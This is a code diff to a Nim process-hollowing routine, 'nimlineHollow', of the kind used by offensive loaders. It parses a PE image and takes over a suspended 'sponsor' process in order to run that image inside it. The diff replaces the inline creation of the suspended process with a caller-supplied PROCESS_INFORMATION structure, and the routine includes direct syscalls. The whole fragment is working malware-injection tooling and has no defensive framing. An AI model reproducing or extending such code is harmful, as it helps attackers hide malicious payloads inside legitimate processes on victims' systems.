@@ -5,7 +5,7 @@ import std/strutils
 include syscalls
 
 
-proc nimlineHollow*(peStr: string, sponsorCmd: LPCSTR): bool =
+proc nimlineHollow*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
 
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
@@ -18,30 +18,11 @@ proc nimlineHollow*(peStr: string, sponsorCmd: LPCSTR): bool =
     var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
     
-    # Create sponsor process suspended
-    when not defined(release): echo "[*] Creating sponsor process suspended" 
-    var si: STARTUPINFOA
-    var pi: PROCESS_INFORMATION
-    if CreateProcessA(
-        NULL,
-        sponsorCmd,
-        NULL, 
-        NULL, 
-        FALSE, 
-        CREATE_SUSPENDED, 
-        NULL, 
-        NULL, 
-        addr si, 
-        addr pi
-    ) != TRUE:
-        when not defined(release): echo "[-] Could not create process"
-        quit()
-
-    let sponsorProcessHandle = pi.hProcess
-    let sponsorThreadHandle = pi.hThread
-    let sponsorPid = pi.dwProcessId
-    let sponsorTid = pi.dwThreadId
-    
+    # Extract process information
+    let sponsorProcessHandle = processInfoAddress.hProcess
+    let sponsorThreadHandle = processInfoAddress.hThread
+    let sponsorPid = processInfoAddress.dwProcessId
+    let sponsorTid = processInfoAddress.dwThreadId
     when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
     when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
     
